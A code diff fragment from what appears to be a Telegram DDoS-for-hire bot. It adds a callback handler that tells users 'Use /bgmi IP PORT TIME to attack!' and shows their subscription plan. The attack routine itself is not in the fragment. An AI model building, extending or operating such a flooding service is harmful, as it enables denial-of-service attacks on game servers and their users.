+    """Handle button callbacks"""
+    try:
+        if call.data == 'start_attack':
+            bot.answer_callback_query(call.id, "Use /bgmi IP PORT TIME to attack!")
+        elif call.data == 'my_stats':
+            bot.answer_callback_query(call.id)
+            show_plan(call.message)
+    except Exception as e:
+        logging.error(f"Callback error: {e}")
 
 if __name__ == "__main__":
-    logging.info("Bot started")
+    logging.info("Starting bot...")
     bot.polling(none_stop=True)
